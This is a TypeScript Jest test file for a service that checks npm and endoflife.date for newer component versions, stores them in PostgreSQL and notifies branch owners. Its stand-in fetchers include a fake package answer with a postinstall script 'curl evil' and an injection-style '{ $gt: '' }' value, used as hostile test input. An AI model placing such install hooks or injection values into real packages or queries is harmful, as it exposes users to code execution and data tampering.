import 'reflect-metadata';
import { randomUUID } from 'node:crypto';
import { createPrismaClient } from '../../db';
import { NoticeService, type NoticeBus } from '../notifications/notice.service';
import { UnitOfWork } from '../platform/unit-of-work';
import type { AlertRepository } from './alert.repository';
import { VersionCheck, fetchJson, startVersionCheck, urlOf, type VersionFetcher } from './version-check';
import { VersionsRepository } from './versions.repository';
import type { StackComponent } from './versions.rules';

// The version check in PostgreSQL (system monitor M.11) on stand-in fetchers: nothing leaves the machine. The
// components are this file's own (named after the run), so the rows it writes and reads are its own; the notices go
// to this file's own owner alone, as in alerts.db.spec.ts (the real audience is every branch owner of the shared
// database). PostgreSQL only (see wallet-concurrency.db.spec.ts for how to give it one).

const url = process.env.TEST_DATABASE_URL;
const suite = url ? describe : describe.skip;

suite('the version check: stand-in calls, what it stores, and its one notice', () => {
  jest.setTimeout(60_000);
  const previousUrl = process.env.DATABASE_URL;
  const previousCheck = process.env.VERSION_CHECK;
  const tag = randomUUID().slice(0, 8);
  const ownerId = randomUUID();
  const lib: StackComponent = { name: `@t${tag}/lib`, kind: 'library' };
  const other: StackComponent = { name: `t${tag}-other`, kind: 'library' };
  const rt: StackComponent = { name: `t${tag}-rt`, kind: 'runtime' };
  const components = [lib, other, rt];
  let prisma: ReturnType<typeof createPrismaClient>;
  let uow: UnitOfWork;
  let repo: VersionsRepository;
  const audience = { branchOwners: async () => [{ id: ownerId }] } as unknown as Pick<AlertRepository, 'branchOwners'>;

  /** The answers by URL; each call is kept. */
  let answers: Record<string, () => Promise<unknown>> = {};
  let calls: string[] = [];
  const fetcher: VersionFetcher = (asked) => {
    calls.push(asked);
    const answer = answers[asked];
    return answer ? answer() : Promise.reject(Object.assign(new Error('no answer'), { code: 'ENOTFOUND' }));
  };
  const cycles = (latest24: string) => [
    { cycle: '26', latest: '26.13.1', eol: '2029-04-30', lts: false, releaseDate: '2026-05-05' },
    { cycle: 24, latest: latest24, eol: '2028-04-30' },
    { cycle: '27', latest: '27.0.0-rc.1', eol: false },
  ];
  const answer = (libVersion: string, otherVersion: string, latest24: string) => {
    answers = {
      [urlOf(lib)]: async () => ({ name: lib.name, version: libVersion, scripts: { postinstall: 'curl evil' } }),
      [urlOf(other)]: async () => ({ version: otherVersion }),
      [urlOf(rt)]: async () => cycles(latest24),
    };
  };
  const check = (timeoutMs = 1_000) => new VersionCheck(repo, uow, audience, fetcher, components, timeoutMs);
  const rows = () => prisma.stackVersion.findMany({ where: { name: { in: components.map((component) => component.name) } }, orderBy: { name: 'asc' } });
  const rowOf = async (component: StackComponent) => (await rows()).find((row) => row.name === component.name);
  const notices = () => prisma.notice.findMany({ where: { userId: ownerId }, orderBy: { createdAt: 'asc' } });
  const clearOwn = async () => {
    await prisma.stackVersion.deleteMany({ where: { name: { in: [...components.map((component) => component.name), `t${tag}-recent`] } } });
    await prisma.notice.deleteMany({ where: { userId: ownerId } });
  };

  beforeAll(async () => {
    process.env.DATABASE_URL = url;
    prisma = createPrismaClient();
    await prisma.user.create({ data: { id: ownerId, loginName: `vc-${tag}-owner`, nickname: 'owner', passwordHash: 'x', layer: 'branch', isBranchOwner: true } });
    const bus: NoticeBus = { publish: async () => undefined, subscribe: async () => async () => undefined };
    uow = new UnitOfWork(new NoticeService(bus));
    uow.prismaClient = prisma;
    repo = new VersionsRepository(uow);
  });

  beforeEach(async () => {
    await clearOwn();
    calls = [];
    answer('1.0.0', '2.0.0', '24.22.3');
    delete process.env.VERSION_CHECK;
  });

  afterEach(() => {
    jest.restoreAllMocks();
    if (previousCheck === undefined) delete process.env.VERSION_CHECK;
    else process.env.VERSION_CHECK = previousCheck;
  });

  afterAll(async () => {
    await clearOwn();
    await prisma.user.deleteMany({ where: { id: ownerId } });
    await prisma.$disconnect();
    process.env.DATABASE_URL = previousUrl;
  });

  it('asks each component by its name alone: the registry\'s latest for a library, endoflife.date for a runtime', async () => {
    await check().run();
    expect(calls.sort()).toEqual([`https://endoflife.date/api/t${tag}-rt.json`, `https://registry.npmjs.org/%40t${tag}%2Flib/latest`, `https://registry.npmjs.org/t${tag}-other/latest`].sort());
  });

  it('the first check stores what came and tells no one; a later one with something newer tells the owner once', async () => {
    expect(await check().run(new Date('2026-11-17T10:00:00Z'))).toEqual({ checked: 3, failed: 0, news: [] });
    expect((await rows()).map(({ name, kind, latest, failed, previousLatest }) => ({ name, kind, latest, failed, previousLatest }))).toEqual([
      { name: lib.name, kind: 'library', latest: '1.0.0', failed: false, previousLatest: null },
      { name: other.name, kind: 'library', latest: '2.0.0', failed: false, previousLatest: null },
      { name: rt.name, kind: 'runtime', latest: '26.13.1', failed: false, previousLatest: null },
    ].sort((a, b) => a.name.localeCompare(b.name)));
    // Only what is read is kept: the cycles' own three fields, the pre-release cycle among them but not taken as newest.
    expect((await rowOf(rt))?.cycles).toEqual([{ cycle: '26', latest: '26.13.1', eol: '2029-04-30' }, { cycle: '24', latest: '24.22.3', eol: '2028-04-30' }, { cycle: '27', latest: '27.0.0-rc.1', eol: false }]);
    expect(await notices()).toEqual([]);
    // Nothing new: nothing told.
    expect((await check().run())?.news).toEqual([]);
    // A newer library, an older answer of the other (a registry going back is not news), and a newer patch in a cycle
    // that is not the newest (the newest is unchanged): one notice, one name.
    answer('1.1.0', '1.9.0', '24.23.0');
    const at = new Date('2026-11-18T10:00:00Z');
    expect(await check().run(at)).toEqual({ checked: 3, failed: 0, news: [lib.name] });
    const told = await notices();
    expect(told.map(({ kind, href, payload }) => ({ kind, href, payload }))).toEqual([{ kind: 'system.update', href: '/system/versions', payload: { count: 1, names: [lib.name] } }]);
    expect(await rowOf(lib)).toMatchObject({ latest: '1.1.0', previousLatest: '1.0.0', foundAt: at, checkedAt: at });
    expect(await rowOf(other)).toMatchObject({ latest: '1.9.0', previousLatest: null });
    expect((await rowOf(rt))?.cycles).toEqual(expect.arrayContaining([{ cycle: '24', latest: '24.23.0', eol: '2028-04-30' }]));
    // The same answers again: no second notice.
    await check().run();
    expect(await notices()).toHaveLength(1);
  });

  it('a slow call, a failing one and a malformed answer each fail their own component, which keeps its last answer', async () => {
    await check().run(new Date('2026-11-17T10:00:00Z'));
    answers = {
      // Never answers and does not listen to its signal: the check's own limit ends its turn.
      [urlOf(lib)]: () => new Promise(() => undefined),
      [urlOf(other)]: async () => { throw Object.assign(new Error('connect ECONNREFUSED 10.0.0.1:443'), { code: 'ECONNREFUSED' }); },
      [urlOf(rt)]: async () => ({ message: 'not a list', version: '99.0.0' }),
    };
    const started = Date.now();
    const at = new Date('2026-11-18T10:00:00Z');
    expect(await check(150).run(at)).toEqual({ checked: 3, failed: 3, news: [] });
    expect(Date.now() - started).toBeLessThan(2_000);
    for (const [component, latest] of [[lib, '1.0.0'], [other, '2.0.0'], [rt, '26.13.1']] as const) {
      expect({ name: component.name, row: await rowOf(component) }).toMatchObject({ name: component.name, row: { latest, failed: true, checkedAt: at } });
    }
    // A malformed library answer too, and one whose version is not text.
    answers = { ...answers, [urlOf(lib)]: async () => ({ version: { $gt: '' } }), [urlOf(other)]: async () => 'x'.repeat(10) };
    expect((await check().run())?.failed).toBe(3);
    // Then answers again: failed no more, and what came is stored.
    answer('1.0.1', '2.0.0', '24.22.3');
    expect(await check().run()).toMatchObject({ failed: 0, news: [lib.name] });
    expect(await rowOf(lib)).toMatchObject({ latest: '1.0.1', failed: false });
  });

  it('a pre-release under the registry\'s latest is never the newest: the last release stays, and is not news', async () => {
    await check().run();
    answer('2.0.0-rc.3', '2.0.0', '24.22.3');
    expect(await check().run()).toMatchObject({ failed: 0, news: [] });
    expect(await rowOf(lib)).toMatchObject({ latest: '1.0.0', failed: false });
    // A pre-release stored by an older build is not kept as a release either.
    await prisma.stackVersion.update({ where: { name: lib.name }, data: { latest: '2.0.0-rc.1' } });
    await check().run();
    expect((await rowOf(lib))?.latest).toBeNull();
    expect(await notices()).toEqual([]);
  });

  it('two checks at the same time tell the news once', async () => {
    await check().run();
    answer('3.0.0', '2.0.0', '24.22.3');
    const [first, second] = await Promise.all([check().run(), check().run()]);
    expect([...(first?.news ?? []), ...(second?.news ?? [])]).toEqual([lib.name]);
    expect(await notices()).toHaveLength(1);
  });

  it('VERSION_CHECK=off calls nothing and writes nothing', async () => {
    process.env.VERSION_CHECK = 'off';
    expect(await check().run()).toBeNull();
    expect(calls).toEqual([]);
    expect(await rows()).toEqual([]);
  });

  it('the default call never leaves the machine from a spec', async () => {
    const spy = jest.spyOn(globalThis, 'fetch');
    await expect(fetchJson('https://registry.npmjs.org/next/latest', new AbortController().signal)).rejects.toMatchObject({ code: 'in_spec' });
    expect(spy).not.toHaveBeenCalled();
  });

  it('the worker\'s timer: a first check shortly after its start, none while the last is under a day old, and a stop that waits', async () => {
    let runs = 0;
    let release: () => void = () => undefined;
    const held = { run: () => { runs += 1; return new Promise<null>((resolve) => { release = () => resolve(null); }); }, abort: () => release() } as unknown as VersionCheck;
    const running = startVersionCheck(uow, { firstAfterMs: 20, tickMs: 30 }, held);
    expect(runs).toBe(0);
    await new Promise((resolve) => setTimeout(resolve, 150));
    // The first is still running: no second one began.
    expect(runs).toBe(1);
    // A stop ends its calls (here: lets it go) and waits for it.
    await running.stop();
    await new Promise((resolve) => setTimeout(resolve, 80));
    expect(runs).toBe(1);
    // A check written a minute ago: the timer finds nothing due.
    await prisma.stackVersion.create({ data: { name: `t${tag}-recent`, kind: 'library', latest: '1.0.0', checkedAt: new Date(Date.now() - 60_000) } });
    let later = 0;
    const counted = { run: async () => { later += 1; return null; }, abort: () => undefined } as unknown as VersionCheck;
    const again = startVersionCheck(uow, { firstAfterMs: 10, tickMs: 20 }, counted);
    await new Promise((resolve) => setTimeout(resolve, 120));
    await again.stop();
    expect(later).toBe(0);
  });
});
